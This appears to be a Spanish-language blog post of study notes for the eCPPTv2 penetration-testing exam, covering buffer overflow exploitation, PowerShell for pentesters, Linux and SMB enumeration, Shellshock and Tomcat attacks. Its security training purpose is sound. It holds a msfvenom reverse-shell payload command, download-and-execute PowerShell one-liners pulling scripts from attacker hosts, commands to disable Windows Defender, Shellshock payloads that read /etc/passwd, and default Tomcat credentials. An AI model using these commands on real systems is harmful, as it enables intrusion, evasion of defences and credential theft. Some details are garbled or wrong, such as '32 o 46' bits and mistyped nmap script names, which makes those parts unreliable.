---
layout: single
title: eCPPTv2 Preparation
excerpt: "Preparacion para el eCPPTv2 "
date: 2022-12-01
classes: wide
header:
  teaser: # /assets/images/hospital-dicom/dicom.png
  teaser_home_page: true
categories:
  - Research
tags:
  - eCPPTv2
  - Certificacion
  - eLearnSecurity
---

# Architecture Fundamentasl

## CPU, ISA and Assembly

### CPU

Es el encargado de ejecutar el código máquina de un programa, estas instrucciones son representadas en formato hexadecimal. 

### ISA

Cada **CPU**  tiene su **instruccion set architecture (ISA)**, en otras palabras **ISA**es lo que un programador puede ver: memoria, registros, instrucciones, etc.
El más común es la arquitectura x86, 

### Assembly

Es el lenguaje máquina traducido en código mnemotécnico, este es llamado **The assembly language (ASM)** 

## Registers

El número de bits, 32 o 46 se refiere al ancho de los registros de CPU; algunos registros tienen funciones especificas mientras algunos otros son usados para almacenar informacion general.

## Process Memory

Cuando un proceso corre, es típicamente organizado en la memoria asi:

|  Text       | Instrucciones   | 
| ------------- |:-------------:| 
| Data     | Variables inicializadas | 
| BSS | Variables inicializadas      | 
| Heap | |
| ⇅ | |
| Stack | 0XFFFFFFFF |

El proceso está dividido en 4 regiones: Texto, Información, "The Heap", y Stack.

* **Texto**: Esta region se encarga de contener el código del programa, es solo de lectura y no se puede hacer cambios.
* **Información**: Dividido en información inicialida y no inicializada, incluye items como "static" y "global", variables declaradas que pueden ser predefinidas.
* **The Heap**: Empieza justo después del BSS, durante la ejecución del programa puede pedir más espacio en la memoria via BRK y SBRK.
* **The Stack**: Es un *Last In First Out (LIFO)*. También se localiza en la parte alta de la memoria.
Se puede decir que un Stack es un array usado para guardar la direccion de retorno de una función.



# Buffer Overflows 

## Finding Buffer Overflows

Algunas aplicaciones usan algunas funciones vulnerables para los Buffer Overflows, entre ellas:

- strcpy
- strcat
- gets/fgets
- scan/fscanf
- vsprintf
- printf
- memcpy
    Pero depende de la función usada; cualquier función que lleve las siguientes las siguientes operaciones también es vulnerable:
- No valida apropiadamente los inputs antes de la operación.
- No revisa los limites del input.

## Exploiting Buffer Overflows

Debemos lograr apoderarnos del EIP ya que ese es el registro que apunta a la siguiente dirección de memoria a ejecutar, primero desbordamos el EBP hasta llegar al ESP. Para conocer el tamaño exacto del buffer a desbordar, podemos usar el pattern_create de msfvenom.

```python
./pattern_create.rb -l $tamaño_aprox
```

Esto nos generará una cadena de caracteres aleatorios los cuales podemos introducir en nuestro programa en python para obtener un EIP.

```python
.-pattern_offset.rb -q $EIP_sobreescrito
```

Después de haber probado la anterior cadena, esto nos da el tamaño exacto del buffer para desbordarlo.

## Analizando el ESP

El payload viene después de sobrescribir el EIP, estará en el comienzo del ESP (la pila) esto hace más cómodo al atacante redirigir el flujo del programa a la pila, ya que al inicio de la pila estará el payload.

Primero debemos encontrar los **"bad chars"** para evitar que el payload nos de error, entre estos el más común es **\\x00**

## Buscamos los Bad Chars

Creamos una carpeta de trabajo con mona

```python
!mona bytearray -cpb "\x00"
```

Comparamos los badchars con mona

```python
!mona compare -f C:\\ruta.bin -a $address
```

Veremos los caracteres no permitidos y realizamos la primera operación creando un array y eliminando los caracteres que nos da la comparación.

## Generamos un shellcode con msfvenom

```python
msfvenom -p windows/shell_reverse-tcp LHOST= LPORT= -a x86 --platform windows -b "$badchars" -e x86/shikata_ga_nai -f C
```

Si tenemos demasiados badchars nos generará error, para solucionar eso eliminamos
`-e x86/shikata_ga_nai`

## Buscamos el OpCode correspondiente a un JMP ESP

Para buscar el OpCode usamos la herramienta de metasploit

```python
./nasm_shell.rb
nasm > jmp ESP
FFE4
```

Con mona listamos los módulos y buscamos un .dll que tenga todo desactivado excepto el `OS Dll`, debemos buscar su OpCode que sea un salto al ESP

```python
!mona find -s "\xff\xe4" -m "modulo.dll"
```
 Buscamos la dirección que no contenga badchars y la copiamos e integramos en nuestro programa para que redireccione el payload de manera correcta.
 
 ## Uso de los NOPs
 
 Para que nuestro shellcode pueda ser interpretado debemos utilizar los NOPs **"\x90"x16** , con esto le damos un tiempo para que nuestro payload sea funcional.
 

# PowerShellfor Pentesters

## Default PowerShell locations

```powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```

## Basic PS commands to start


```powershell
Get-Help * #List everything loaded
Get-Help process #List everything containing "process"
Get-Help Get-Item -Full #Get full helpabout a topic
Get-Help Get-Item -Examples #List examples
Import-Module <modulepath>
Get-Command -Module <modulename>
```

## Download & Execute

```powershell
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://10.10.14.9:8000/ipw.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

## Using b64 from linux

```powershell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```

# Download

##  System.Net.WebClient

```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
```

## Invoke-WebRequest

```powershell
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
```

## Wget

```powershell
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
```

## BitsTransfer

```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
# OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

## Disable Defender

```powershell
# Check status
Get-MpComputerStatus
Get-MpPreference | select Exclusion* | fl #Check exclusions
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
#To completely disable Windows Defender on a computer, use the command:
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Set exclusion path
Add-MpPreference -ExclusionPath "C:\users\public\documents\magichk"
Set-MpPreference -ExclusionPath "C:\users\public\documents\magichk"

# Check exclusions configured via GPO
Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```

## PS-History

```powershell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```

## Get permissions

```powershell
Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```

## OS version and HotFixes

```powershell
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

## Domain Recon

[PowerView /SharpView](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview)

## Users

```powershell
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
```

## Groups

```powershell
Get-LocalGroup | ft Name #All groups
Get-LocalGroupMember Administrators | ft Name, PrincipalSource #Members of Administrators
```

## Processes

```powershell
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
# Network

## Interfaces

```powershell
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

## Route

```powershell
route print
```

## ARP

```powershell
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```

## Hosts

```powershell
Get-Content C:\WINDOWS\System32\drivers\etc\hosts
```

## ping

```powershell
$ping = New-Object System.Net.Networkinformation.Ping
1..254 | % { $ping.send("10.9.15.$_") | select address, status }
```

# Linux Explotation

# Remote Enumeration

## Enumerating NFS

Network File System es un protocolo que comparte archivos, a menudo lo encuentras en sistemas Unix-like, trabaja en el puerto 2049 por TCP y también por UDP.
Podemos usar algunos scripts de nmap para poder enumerar algunos archivos:

```bash
nmap --script nfs-ls,mfs-showmount,nft-statfs <IP>
```

Y para poder reconstruirlo usamos `showmount -e <IP>`, por ejemplosupongamos que se comparte **/var/home/  -    /home/bob**, para ello creamos las carpetas en nuestra maquina local con `mkdir -p /mnt/home.bob` después exportamos el directorio con `mount -t nfs <NFS SERVER IP>:/home/bob /mnt/home/bob -o nolock`
Y con esto podemos visualizar los archivos compartidos.

## Enumerating Portmapper(RPCBIND)

Es típicamente encontrado en el puerto 111 ya sea TCP/UDP  y a veces en el puerto 32771.

`nmap --script rpc-grind,rpcinfo <IP> -p 111`

Y para enumerar usamos `xinetd`

## Enumerating SMB

Podemos usar la utilidad `rpcclient` de Samba para interactuar con puntos finales de RPC a través de canalizaciones con nombre. A continuación, se enumeran los comandos que puede emitir las interfaces SAMR, LSARPC y LSARPC-DS al establecer una sesión SMB.

### Server Info

* Server Info: `srvinfo`

### Users enumeration
*  List users: `querydispinfo and enumdomusers`
* Get user details: `queryuser <0xrid>`
* Get user groups: `queryusergroups <0xrid>`
* GET SID of a user: `lookupnames <username>`
* Get users aliases: `queryuseraliases [builtin|domain] <sid>`

```python
# Brute-Force users RIDs
for i in $(seq 500 1100); do
    rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";
done

# You can also use samrdump.py for this purpose
```

### Groups enumeration

List groups: `enumdomgroups`
Get group details: `querygroup <0xrid>`
Get group members: `querygroupmem <0xrid>`

### Aliasgroups enumeration

List alias: `enumalsgroups <builtin|domain>`
Get members: `queryaliasmem builtin|domain <0xrid>`

### Domains enumeration

List domains: `enumdomains`
Get SID: `lsaquery`
Domain info: `querydominfo`

### Shares enumeration

Enumerate all available shares: `netshareenumall`
Info about a share: `netsharegetinfo <share>`

# Local Enumeration

## Network Enumeration

```powershell
ifconfig #Lista las interfaces
route -n #Lista las iproutes
traceroute -n <IP> #Para saber cuantos saltos hay entre una maquina a otra
cat /etc/resolv.conf #Lista las DNS
arp-en #ARP cache
netstat -auntp #Lista las conecciones TCP/UDP
cat /proc/net/tcp 
cat /proc/net/udp
ss -twurp #Lista conecciones activas TCP/UDP Ports/Conecctions
id
uname -a
grep $user /etc/passwd
last log
w #Quien está actualmente conectado al sistema 
last
sudo -l
ls -als /root/ #Lista el home directory de root
echo $PATH
cat /etc/crontab && ls -als /etc/cron* #lista las cron jobs
find /etc/cron* -type f -perm -o+w -exec ls -l {} \; #Encuentra las cron jobs world-writeable
ps auxwww 
ps -u root
find / -perm -4000 -type f 2>/dev/null
find -uid 0 -perm -4000 -type f 2>/dev/null
lsof -n

```

# Exploitation over the Network

## Shellshock 

Para entenderlo tomaremos un metodo para determinar si el sistema es vulnerable.
Cuando ejecutamos este comando en un sistema vulnerable nos deberia imprimir "vulnerable".
```
env x='() { :;}; echo vulnerable' bash -c "echo es una prueba"
```

Tambien lo podemos encontrar en algunos servidores web, interceptamos la peticion que normalmente termina en archivos ***.cgi***  
`"User-Agent: () {:;}; /bin/eject"`
`curl -H "User-Agent: () {:;}; /bin/eject" http://example.com
`
`./dirsearch.py -u http://IP/ -e cgi -r`
`wget -U "() { foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://IP/cgi-bin/login.cgi && cat login.cgi`

## Exploiting Apache Tomcat

Normalmente corre en el puerto 8080

### Enumeration

* Version

`curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat `

* Locate manager files 
 
 Las paginas interesantes se encuentran en **/manager** y **/host-manager**, puedes buscarlos con fuerza bruta.
 
 * Username Enum
 `msf> use auxiliary/scanner/http/tomcat_enum`
 
 * Default credentials
 
| Users         | Passwords      |
| ------------- |:-------------:| 
|    admin 	  | admin | 
|   tomcat 		  | tomcat | 
|   admin   | (NOTHING) |
|   admin   | s3cr3t |
|   tomcat   |  s3cr3t |
|   admin   | tomcat | 

Podemos testearlos con:
`msf> use auxiliary/scanner/http/tomcat_mgr_login`



